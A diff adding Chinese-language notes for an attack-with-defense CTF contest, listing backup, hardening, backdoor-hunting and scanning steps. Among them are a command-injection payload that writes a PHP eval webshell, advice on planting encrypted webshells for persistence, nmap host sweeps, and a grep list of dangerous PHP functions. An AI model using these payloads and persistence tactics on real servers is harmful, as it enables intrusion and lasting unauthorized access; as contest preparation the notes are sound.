@@ -1,0 +1,69 @@
+1、备份！！！、查看服务，修改默认密码，特别是 ssh的密码
+但是注意 如果是使用得主办方给的 ctf/ctf 账号，可能出现备份下来的文件会有缺少，因为ctf用户的权限没得 www-data的大。不过需要做的是不要删除服务器的源码，而是采用覆盖还原的的方式。
+
+2、将下载的网站 进行 d盾扫描。找到后门。利用  蚁剑 连接，因为 蚁剑连接的 用户一般为 www-data。权限比较大，利用这个后门上传可控一句话。
+	方法：*** 1、本地写一个 加密后（32150d1a0dfece88）的后门（good.php），利用已有的后门上传，即可维持。利用这个后门进行操作，删除简易后门上传等。
+		2、为了防止人家也利用这个后门，可上传weekly生成的免杀、加密后门（/awdTools/Pulishb.php），就算被人得知，也需要分析才能得出密码。但是这个弊端是不能使用蚁剑。只能命令行。
+
+3、备份之后的网站，
+	1、需要进行将所有的后门修改、删除。
+	2、将数据库的密码修改
+	3、设法找出隐藏后门。
+将修改好了的网站，打包成tar。 
+tar -cf ../html.tar *
+利用蚁剑上传。利用蚁剑 恢复覆盖。否者会权限不够。
+
+4、上传图片，以为 waf里面只对后缀名/类型进行检测了，但是对内容没有检测，
+但是上传源码为 /var/www/html/application/attachment/controller/Upload.php。  可以将其中的保存的位置修改了，这样上传了也无法找到具体位置。
+
+5、waf不能加全局，因为check会带上一点识别通防payload的
+
+6、通过命令写一句话：mobile=system&event=echo '<?php eval($_POST['pass']); ?>' >> b.php
+
+7、thinkPHP，application中是放置的一个一个模块，可以通过index.php/模块/控制器下的类名/类中的函数的形式执行
+注意 只能是控制器，其他的访问不了
+
+8、rsync
+
+9、diff
+
+10、crontab
+
+11、find . -name '*.php' | xargs grep (-n) 'eval('   其实就在seay中就有全局搜索的方式，先dump源码，再全局搜索
+
+	'eval('   'assert('    'system('   'shell_exec('   'exec('     'proc_open('    'preg_replace('
+
+
+12、想知道你的系统有几种shell，可以通过以下命令查看：cat /etc/shells
+
+13、nmap 导出存活主机IP 
+nmap -sn 192.168.95.1/24 | grep 192.*.*.* | awk '{print $5}' 
+nmap -sn 192.168.0.1/24 | grep -o -E 192.*.*.* >> D:\ip.txt
+
+
+14、查看开启的服务。 
+	service --status-all     
+	如果找不到service 命令， 就是用  
+	systemctl | grep running 
+	pstree
+如果是centOS7, 可以尝试使用以下查看服务开启的命令
+	initctl list
+	chkservice
+	systemctl | grep apache2  这是查看具体服务
+15、隐藏多级目录下     搜 select 、update
+
+16、一定需要使用burp suit 进行抓包，因为一些请求无法在浏览器中显示，但在burp suit中可以显示。
+
+17、使用weevly 也可连接普通后门，反正就是蚁剑能连接，weevly能连，但是weevly生成的backdoor只能weevly连接
+
+18、对抗不死马，rm -f -r .index.php | mkdir .index.php ,  一定是使用了 管道符
+m -r -f published.php | mkdir published.php, 反复运行这个。
+
+19、密码是一样的。所以赶紧备份，修改密码，上监控脚本，上waf，上防篡改脚本、d盾扫后门，先修、再打、审计源码找隐藏后门、防守人员进行日志监控，看人家怎么打自己。
+
+20、上传文件jsp一句话，直接连接即可
+
+21、查看是否存在命令、sql、文件包含的存在，一般就是关注输入框，用户输入的地方不可控。
+
+22、tomcat、webloginc的常见漏洞，比如：反序列化、rec，等，可使用searchexpolit 中搜索 
+
